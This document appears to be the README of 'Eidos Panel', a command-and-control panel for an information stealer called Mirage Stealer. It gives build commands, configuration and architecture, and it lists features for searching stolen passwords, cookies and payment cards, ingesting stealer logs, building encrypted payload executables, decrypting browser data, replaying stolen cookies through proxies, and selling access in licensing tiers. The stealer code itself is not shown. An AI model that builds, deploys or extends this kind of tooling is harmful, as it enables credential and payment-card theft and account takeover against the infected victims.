# Eidos Panel

Modern C2 panel for Mirage Stealer ecosystem — Go backend + React frontend in a single binary.

## Quick Start

```bash
# Option 1: Docker
docker build -t eidos-panel .
docker run -p 8080:8080 -v ./data:/data eidos-panel

# Option 2: Native
cd web && npm ci && npm run build
cd .. && go build -o eidos-panel ./cmd/panel
./eidos-panel

# Option 3: Development
cd web && npm run dev &
go run ./cmd/panel
```

## Features

| Feature | Status |
|---------|--------|
| Dashboard with live WebSocket updates | ✅ |
| Session management (paginated, sortable, filterable) | ✅ |
| Full-text search across passwords, cookies, cards | ✅ |
| Log ingestion (multipart, chunked, ZIP) | ✅ |
| PE Builder with AES-GCM config encryption | ✅ |
| Server-Side Processing (Chrome/Gecko decrypt) | ✅ |
| Telegram Bot integration | ✅ |
| Multi-user with RBAC + invite codes | ✅ |
| Session locking (worker claims) | ✅ |
| Licensing system (Starter/Pro/Team tiers) | ✅ |
| Cookie Restore via SOCKS5 proxy | ✅ |
| PostgreSQL support | ✅ |
| Dark/Light theme | ✅ |
| i18n (EN/RU) | ✅ |
| Export (JSON/HTML/bulk) | ✅ |
| Audit log | ✅ |

## Configuration

| Variable | Default | Description |
|----------|---------|-------------|
| `PORT` | 8080 | HTTP port |
| `DB_PATH` | data/mirage.db | SQLite database path |
| `JWT_SECRET` | (auto) | JWT signing key |
| `DB_PROVIDER` | sqlite | sqlite or postgres |
| `DATABASE_URL` | — | Postgres connection string |
| `TLS_ENABLED` | false | Enable HTTPS |
| `TLS_DOMAIN` | — | Domain for Let's Encrypt |

## Architecture

```
                     ┌──────────────────────┐
                     │   React SPA (Vite)    │
                     │   shadcn/ui + Recharts│
                     └──────────┬───────────┘
                                │ REST + WS
                     ┌──────────┴───────────┐
                     │   Go (chi router)     │
                     │   JWT auth + RBAC     │
                     │   SQLite / PostgreSQL │
                     └──────────────────────┘
```

## Project Structure

```
Mirage.Panel/
├── cmd/panel/main.go        # Entry point
├── internal/
│   ├── api/                 # HTTP handlers
│   ├── auth/                # JWT + BCrypt
│   ├── db/                  # SQLite + migrations
│   ├── middleware/          # Auth, RBAC, rate limit, CORS
│   ├── services/            # LogProcessor, Build, Licensing
│   └── ws/                  # WebSocket hub
└── web/                     # React frontend
```

## License

Proprietary — see LICENSE file.
